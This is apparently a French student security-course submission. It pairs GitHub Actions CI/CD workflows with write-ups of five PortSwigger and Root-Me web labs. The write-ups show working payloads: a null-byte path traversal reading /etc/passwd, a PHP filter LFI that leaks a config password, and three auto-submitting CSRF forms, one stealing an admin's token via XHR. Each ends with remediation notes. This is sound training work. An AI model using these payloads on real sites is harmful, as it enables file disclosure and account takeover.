
GROUPE : 

VICTOIRE Lytween
DUVERNOIS Elias

## Public GitHub repository URL

https://github.com/Eliasf1912/CI-CD-S-curit-Web 

## Screenshot of CI pipeline passing in GitHub Actions

<img width="642" height="430" alt="image" src="https://github.com/user-attachments/assets/fcf47cc1-9163-406a-8191-7ecaed5974b9" />

<img width="642" height="430" alt="image" src="https://github.com/user-attachments/assets/7203ea64-9e03-4001-85d7-3b23b529b6c6" />

<img width="642" height="430" alt="image" src="https://github.com/user-attachments/assets/fccad3ad-6885-4723-af42-cb53dddeca48" />

## Screenshot of CD pipeline passing in GitHub Actions

<img width="624" height="430" alt="image" src="https://github.com/user-attachments/assets/d8e553a2-1de4-4b9d-ae73-3c32c33933a6" />

## Screenshot of your Docker Hub repository showing the image

<img width="624" height="214" alt="Capture d&#39;écran 2026-04-01 235309" src="https://github.com/user-attachments/assets/76a6c58e-d26d-4b54-bf11-1ed4cc3c3797" />
>> https://hub.docker.com/u/rosves

## All the files you created (in blocks of code)

**CD pipeline**

```
  name: CD
  
  on:
    workflow_run:
      workflows:
        - CI
      types:
        - completed
      branches:
        - main
  
  jobs:
    build:
      runs-on: ubuntu-latest
      if: ${{ github.event.workflow_run.conclusion == 'success' }}
  
      steps:
      - name: checkout
        uses: actions/checkout@v5
  
      - name: login
        uses: docker/login-action@v3
        with:
          username: ${{ secrets.DOCKER_USERNAME }}
          password: ${{ secrets.DOCKER_PASSWORD }}
  
      - name: build and push
        id: push
        uses: docker/build-push-action@v6
        with:
          context: .
          file: ./Dockerfile
          push: true
          tags: rosves/app:latest
```

**CI pipeline**

```
  on:
    push:
      branches:
        - main
    workflow_dispatch:
  
  permissions:
    contents: read
    security-events: write
    actions: read
  
  jobs:
    test:
      runs-on: ubuntu-latest
      strategy:
        matrix:
          python-version: [3.8, 3.9, "3.10"]
  
      steps:
        - name: checkout
          uses: actions/checkout@v5
  
        - name: Python ${{ matrix.python-version }}
          uses: actions/setup-python@v6
          with:
            python-version: ${{ matrix.python-version }}
  
        - name: dependencies
          run: |
            python -m pip install --upgrade pip
            pip install flake8 pytest
  
        - name: flake8
          run: |
            flake8 . --count --select=E9,F63,F7,F82 --show-source --statistics
            flake8 . --count --exit-zero --statistics
  
        - name: pytest
          run: pytest tests/
          
  
    trivy-scan :
      runs-on : ubuntu-latest
  
      steps :
      - name : checkout
        uses : actions/checkout@v5
  
      - name : trivy FS mode
        uses : aquasecurity/trivy-action@v0.35.0
        with : 
          scan-type: fs
          format: 'sarif'
          severity: 'CRITICAL,HIGH'
          output: 'results.sarif'
      
      - name : upload
        uses : github/codeql-action/upload-sarif@v4
        with : 
            sarif_file: 'results.sarif'
```

CHALLENGES

Challenge 1 : 

Lab: File path traversal, validation of file extension with null byte bypass

Je vais sur le site du lab, je clique sur un des produits et je vais dans burpsuite. J’intercepte la page produit, je transfère et maintenant j’ai le lien de l’image. Je la selectionne et vais dans “repeater”. J’appuie sur “Send” quand même pour verifier le comportement. Après je change la value de “filename” avec un path tranversal “../../../etc/passwd” et comme il fallait un nullbyte, je l’ai testé un peu partout. Et la réponse 200 est apparue avec “../../../etc/passwd%00.png”. 

<img width="1061" height="855" alt="Screenshot 2026-04-15 at 11 20 20" src="https://github.com/user-attachments/assets/b1d70e6f-e9da-4386-b87f-477c5033af6f" />

Pour remedier à ce projet, on pourrait déja nettoyer les entrées pour eviter qu’on puisse mettre des paths traversal. On peut aussi utiliser une whitelist pour les fichiers acceptés/acceptables et une whitelist de chemins explicites pour eviter qu’on puisse aller trop loin avec un path traversal. 

source : https://owasp.org/www-community/attacks/Path_Traversal

challenge 2 :

root me : PHP - Filters

<img width="1297" height="891" alt="Screenshot 2026-04-17 at 16 55 09" src="https://github.com/user-attachments/assets/f3b6599b-39db-4ea3-ab89-12d4164fcf62" />
<img width="1297" height="891" alt="Screenshot 2026-04-17 at 16 58 52" src="https://github.com/user-attachments/assets/2f349c01-305d-416a-869a-bf7ad66c415a" />

- je clique sur la page home et la page login pour vérifier les comportements
- j’utilise un path transversal “../../” avant le “login.php” de l’url et j’ai 3 warnings
- en gros on comprend qu’il y a un parametre include() (inc) dans l’adresse qui m’empeche de d’aller plus loin dans le repertoire à l’aide d’un path transversal et qui renvoie le html qu’on voit sur la page directement
- on met un filtre sur le ‘inc’ qui va encoder le resultat de la page en base64 sur “login.php” “?inc=php://filter/convert.base64-encode/resource=login.php” cf. image 1 > trouvé sur le lien en source
- sur burpsuite dans le repeater et sur la page, il y a un resultat en base64. Sur la droite de l’image 1, on voit le texte selectionné décodé et il y a “config.php” dans le include() du coup. + le mot de passe est dans une variable donc toujours pas visible
- je remets le même lien mais à la place de “login.php” je mets “config.php”
- pareil, je vérfie la partie “decoded code” à drotie sur burpsuite et le mot de passe est visible
- je copie le mot de passe et je le mets sur la page du défi pour validé le défi

recommandation : déjà eviter les “?inc=” qui peuvent mener à des LFI comme ici vu que le user peut manipuler le chemin et une whitelist stricte avec les liens/chemins autorisés. nettoyer les chemins pour qu’on puisse empêcher les requetes dans l’url.

source : https://medium.com/@Aptive/local-file-inclusion-lfi-web-application-penetration-testing-cc9dc8dd3601 (php wrappers) https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_File_Inclusion https://www.pivotpointsecurity.com/file-inclusion-vulnerabilities/

challenge 3 : root me CSRF - contournement de jeton

<img width="661" height="581" alt="Screenshot 2026-04-19 at 00 32 39" src="https://github.com/user-attachments/assets/4048ac47-a761-49d7-8441-a1939e43f465" />

```
<form name="csrf" action="http://challenge01.root-me.org/web-client/ch23/?action=profile" method="post" enctype="multipart/form-data">
<input type="hidden" name="username" value="sunshine" />
<input type="hidden" name="status" value="on" />
<input type="hidden" id="token" name="token" value="" />
</form>

<script>
var xhr = new XMLHttpRequest();
xhr.open("GET", "http://challenge01.root-me.org/web-client/ch23/?action=profile", false);
xhr.send(null);
var token = xhr.responseText.match(/name="token" value="(.+?)"/)[1];
document.getElementById("token").value = token;
document.csrf.submit();
</script>
```
<img width="667" height="291" alt="Screenshot 2026-04-19 at 00 27 09" src="https://github.com/user-attachments/assets/5b95fe3c-368a-46f0-8d2b-2023305f3166" />

- je fais un compte et je dois attende que l’admin valide mon compte
- après avoir checker toutes les pages, urls et les resultats sur burpsuite, je vois que le formulaire de contact comme solution
- j’envoie du code dans le corps du formulaire de contact au robot_admin pour qu’il le traite et qui est exécuté dans son navigateur avec sa session
- comme le script a une requête xhr get, le script est exécuté avec le cookie du robot admin et le serveur renvoie la page profile avec le token csrf extrait de la reponse
- je rafraichis et je vais sur private et il y a le mot de passe pour valider le défi

recommandations : token csrf unique et généré coté serveur pour éviter qu’on puisse le recuperer avec un xss, une reconnexion obligatoire pour les actions admins et/ou MFA 

source : https://hacktricks.wiki/en/pentesting-web/csrf-cross-site-request-forgery.html

https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf 

https://www.youtube.com/watch?v=MI7IPZM2yac  
https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html

challenge 4 : Lab: CSRF where token is not tied to user session
<img width="1286" height="581" alt="Screenshot 2026-04-19 at 14 29 13" src="https://github.com/user-attachments/assets/c09edf25-affc-4c65-9b14-6d65df0697f6" /> 
<img width="1286" height="581" alt="Screenshot 2026-04-19 at 13 53 10" src="https://github.com/user-attachments/assets/edb9deed-d73a-4628-9050-4bd0e0c7ee73" />
<img width="1286" height="581" alt="Screenshot 2026-04-19 at 13 55 45" src="https://github.com/user-attachments/assets/738855dc-0f4a-422a-b617-7094990cef99" />

- je me connecte avec les identifiants de peter et je vais sur la page pour changer d’email
- je mets une autre adresse mail, je vais sur burpsuite pour intercepter la réponse
- je récupère le csrf (cf image 1) et je drop la requete pour pas utiliser le csrf sinon je dois recommencer
- je vais sur la page “exploit server” et je mets mon payload “
```
<form method="POST" action="https://0ae2000103c3066b80378009008600de.web-security-academy.net/my-account/change-email">
<input type="hidden" name="email" [value="bang@bang.com](mailto:value=%22bang@bang.com)" />
<input type="hidden" name="csrf" value="vlGyBkWNxJGALwmKnFQnFYZRZO0wDJen" />
</form>
<script>
document.forms[0].submit();
</script>
```
“dedans on retrouve l’url que je vise, la nouvelle adresse mail et le csrf pas utilisé que j’ai récupéré sur burpsuite.

- apres j’envoie avec “deliver” et le lab est validé

recomandations : déjà un token csrf unique à l’utilisateur et par session, et eliminer les failles xss pour eviter qu’on puisse récupérer le token

https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html 

challenge 5 : Lab: CSRF where Referer validation depends on header being present
<img width="1354" height="581" alt="Screenshot 2026-04-19 at 16 18 14" src="https://github.com/user-attachments/assets/5938db80-1c34-4c4b-b272-bfee4fe985d1" />
<img width="1354" height="581" alt="Screenshot 2026-04-19 at 16 19 40" src="https://github.com/user-attachments/assets/e6db87aa-c98c-4eeb-9ae1-09a09700362c" />
<img width="1354" height="581" alt="Screenshot 2026-04-19 at 16 23 51" src="https://github.com/user-attachments/assets/5de48d23-5cdb-43e3-8bf2-2535220371b1" />
<img width="1354" height="700" alt="Screenshot 2026-04-19 at 16 26 56" src="https://github.com/user-attachments/assets/9f9ed09b-b5eb-41b4-a769-c271fb6e745e" />
<img width="1354" height="700" alt="Screenshot 2026-04-19 at 16 27 59" src="https://github.com/user-attachments/assets/e36b91a8-e66e-4611-a5c5-d380f66176d1" />

- je regarde comment fonctionne le referer dans le header grace à la page de changement d’email
- je l’ai supprimé et le comportement est le même donc la faille est là
- je vais sur la page de l’exploit et je mets un payload avec “no-referrer” en value du referer (cf. image 4) pour que le referrer ne soit pas inclus par le navigateur, je change l’adresse
- ```
  <meta name="referrer" content="no-referrer">
  <form method="POST" action="https://0aa2007c04c9beb5807a1cb000b20019.web-security-academy.net/my-account/change-email">
  <input type="hidden" name="email" [value="bang@bang.com](mailto:value=%22bang@bang.com)" />
  </form>
  <script>
  document.forms[0].submit();
  </script>
  ```
- j’envoie au client et le lab est validé

recommandation : eviter d’avoir uniquement le referrer comme sécurité comme c’est manipulable, utiliser des tokens csrf géré dans le back et unique par session, s’identifier à nouveau pour les actions sensibles/admins. nettoyer les entrés pour éviter les failles xss et vol de tokens

source : https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html 

https://owasp.org/www-community/attacks/csrf

[https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit](SSTI)


